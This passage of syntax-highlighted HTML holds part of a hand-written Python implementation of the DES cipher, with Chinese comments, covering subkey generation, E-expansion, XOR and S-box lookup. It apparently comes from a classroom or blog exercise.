punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span>            <span class="token comment">#检查坐标</span>            L0<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>rep_mingwen<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#得到d0</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            x<span class="token punctuation">,</span>y <span class="token operator">=</span> get_xy<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>rep<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span>            <span class="token comment">#检查坐标</span>            R0<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>rep_mingwen<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span>L0<span class="token punctuation">,</span>R0<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">get_xy</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>row<span class="token punctuation">,</span>col<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># n为要转化为坐标的数值</span>    <span class="token keyword">if</span> n <span class="token operator">%</span> col <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>n<span class="token operator">/</span>col<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">1</span>        y <span class="token operator">=</span> col <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>n<span class="token operator">/</span>col<span class="token punctuation">)</span>        y <span class="token operator">=</span> n<span class="token operator">%</span>col <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">replace</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span>rep<span class="token punctuation">,</span>row<span class="token punctuation">,</span>col<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 定义一个置换函数，参数temp为要替换的矩阵，file为替换矩阵，row列，col行</span>    new_temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>col<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token comment"># 用来保存置换后的矩阵并作为返回值</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            x<span class="token punctuation">,</span>y <span class="token operator">=</span> get_xy<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>rep<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>row<span class="token punctuation">,</span>col<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rep<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">8</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                new_temp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">[</span>x<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span>                <span class="token comment"># print(temp[x-1][7],end = ' ')</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                new_temp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span>    <span class="token keyword">return</span> new_temp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">child_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 生成k1~k16的子密钥</span>    key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    KEY <span class="token operator">=</span> <span class="token string">"abcdefgh"</span>    str1_hex <span class="token operator">=</span> ord_bin<span class="token punctuation">(</span>KEY<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> str1_hex<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> j<span class="token punctuation">]</span>    <span class="token comment"># 读取64位key</span>    c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    d <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    k <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    c0<span class="token punctuation">,</span>d0 <span class="token operator">=</span> create_L0R0<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 得到c0,d0</span>    num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment"># 设置第n次循环左移位数</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 将生成k1~k16的子密钥存放在列表k中</span>        c0 <span class="token operator">=</span> my_move<span class="token punctuation">(</span>c0<span class="token punctuation">,</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        d0 <span class="token operator">=</span> my_move<span class="token punctuation">(</span>d0<span class="token punctuation">,</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        k1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        k1<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>c0<span class="token punctuation">)</span>        k1<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>d0<span class="token punctuation">)</span>        pc_2 <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"PC-2.txt"</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span>        temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment"># 暂时存放56位子密钥</span>        <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>k1<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>pc_2<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        k<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    <span class="token keyword">return</span> k<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token comment"># k位16x48的子密钥二维数组</span><span class="token keyword">def</span> <span class="token function">my_move</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#循环移位，n为移位数</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">##左移</span>        <span class="token builtin">list</span><span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token builtin">list</span><span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">list</span><span class="token keyword">def</span> <span class="token function">E_extend</span><span class="token punctuation">(</span>R0<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#将32位Ri扩展位48位</span>    Ri <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    e <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"E_extend.txt"</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            Ri<span class="token punctuation">.</span>append<span class="token punctuation">(</span>R0<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>e<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">#print(Ri)</span>    <span class="token keyword">return</span> Ri<span class="token keyword">def</span> <span class="token function">yihuo</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#进行异或运算</span>    B <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">int</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            b<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            b<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        B<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">return</span>  B<span class="token keyword">def</span> <span class="token function">create_B</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span>ERi<span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#进行异或运算，K为48位子密钥列表，ERi为48位扩展的Ri,num是轮数</span>    B <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>K<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>K<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> K<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">==</span> ERi<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">:</span>                b<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                b<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        B<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">return</span>  B<span class="token punctuation">[</span>num<span class="token punctuation">]</span>    <span class="token comment">#返回值为B0~B7的集合列表B</span><span class="token keyword">def</span> <span class="token function">get_bi</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">:</span>    b0 <span class="token operator">=</span> <span class="token string">''</span>    b1 <span class="token operator">=</span> <span class="token string">''</span>    b2 <span class="token operator">=</span> <span class="token string">''</span>    b3 <span class="token operator">=</span> <span class="token string">''</span>    b4 <span class="token operator">=</span> <span class="token string">''</span>    b5 <span class="token operator">=</span> <span class="token string">''</span>    b6 <span class="token operator">=</span> <span class="token string">''</span>    b7 <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b0 <span class="token operator">=</span> b0 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b1 <span class="token operator">=</span> b1 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b2 <span class="token operator">=</span> b2 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b3 <span class="token operator">=</span> b3 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b4 <span class="token operator">=</span> b4 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b5 <span class="token operator">=</span> b5 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b6 <span class="token operator">=</span> b6 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b7 <span class="token operator">=</span> b7 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span>b0<span class="token punctuation">,</span>b1<span class="token punctuation">,</span>b2<span class="token punctuation">,</span>b3<span class="token punctuation">,</span>b4<span class="token punctuation">,</span>b5<span class="token punctuation">,</span>b6<span class="token punctuation">,</span>b7<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">get_lastR</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span>R0<span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#num为轮数</span>    ERi <span class="token operator">=</span> E_extend<span class="token punctuation">(</span>R0<span class="token punctuation">)</span>    <span class="token comment">#E扩展</span>    B <span class="token operator">=</span> create_B<span class="token punctuation">(</span>K<span class="token punctuation">,</span>ERi<span class="token punctuation">,</span>num<span class="token punctuation">)</span>    <span class="token comment">#num轮数用来控制Ki</span>    b0<span class="token punctuation">,</span>b1<span class="token punctuation">,</span>b2<span class="token punctuation">,</span>b3<span class="token punctuation">,</span>b4<span class="token punctuation">,</span>b5<span class="token punctuation">,</span>b6<span class="token punctuation">,</span>b7 <span class="token operator">=</span> get_bi<span class="token punctuation">(</span>B<span class="token punctuation">)</span>    b0 <span class="token operator">=</span> cut_bi<span class="token punctuation">(</span>b0<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>    b1 <span class="token operator">=</span> cut_bi<span class="token punctuation">(</span>b1<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    b2 <span class="token operator">=</span> cut_bi<span class="token punctuation">(</span>b2<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>    b3 <span class="token operator">=</span> cut_bi<span class="token punctuation">(</span>b3<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>    b4 <span class="token operator">=</span> cut_bi<span class="token punctuation">(</span>b4<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>    b5 <span class="token operator">=</span> cut_bi<span class="token punctuation">(</span>b5<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>    b6 <span class="token operator">=</span> cut_bi<span class="token punctuation">(</span>b6<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span>    b7 <span class="token operator">=</span> cut_bi<span class="token punctuation">(</span>b7<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span>    last_R <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    last_R<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>b0<span class="token punctuation">)</span>    last_R<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>b1<span class="token punctuation">)</span>    last_R<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>b2<span class="token punctuation">)</span>    last_R<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>b3<span class="token punctuation">)</span>    last_R<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>b4<span class="token punctuation">)</span>    last_R<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>b5<span class="token punctuation">)</span>    last_R<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>b6<span class="token punctuation">)</span>    last_R<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>b7<span class="token punctuation">)</span>    <span class="token keyword">return</span> last_R<span class="token keyword">def</span> <span class="token function">read_s</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> num<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"S_box1.txt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> num<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"S_box2.txt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> num<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"S_box3.txt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> num<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"S_box4.txt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> num<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"S_box5.txt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> num<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"S_box6.txt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> num<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"S_box7.txt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"S_box8.txt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">def</span> <span class="token function">cut_bi</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> my_int2<span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    y <span class="token operator">=</span> my_int4<span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> read_s<span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>    s <span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    temp <span class="token operator">=</span> read_s<span class="token punctuation">(</span>n<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>append<span class="token punctuation">(</span>my_bin<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">def</span> <span class="token function">my_int2</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span>a2<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> a1 <span class="token operator">+</span> a2    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token string">'00'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'01'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'10'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> a<span class="token keyword">def</span> <span class="token function">my_int4</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span>a2<span class="token punctuation">,</span>a3<span class="token punctuation">,</span>a4<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> a1 <span class="token operator">+</span> a2 <span class="token operator">+</span> a3 <span class="token operator">+</span> a4    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token string">'0000'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'0001'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token 